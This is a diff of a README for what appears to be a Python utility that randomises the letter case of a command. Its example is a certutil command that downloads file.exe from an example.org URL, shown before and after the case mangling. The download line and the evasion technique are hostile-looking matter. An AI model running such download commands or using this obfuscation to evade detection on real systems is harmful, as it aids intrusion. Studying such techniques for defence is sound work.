@@ -12,7 +12,9 @@ Running main.py will return an input prompt. Type or paste in your script or cmd
 ### Example:
 
 ```python
-script = "certutil.exe -urlcache -f https://www.example.org/file.exe file.exe"
+PS C:\Users\Pauly\main.py
+Enter script: "certutil.exe -urlcache -f https://www.example.org/file.exe file.exe"
+cErTUtIl.exe -urlcaCHE -f HtTps://WWW.EXAmple.Org/FilE.EXE fILE.ExE
 ```
 
 ### Current Progress:
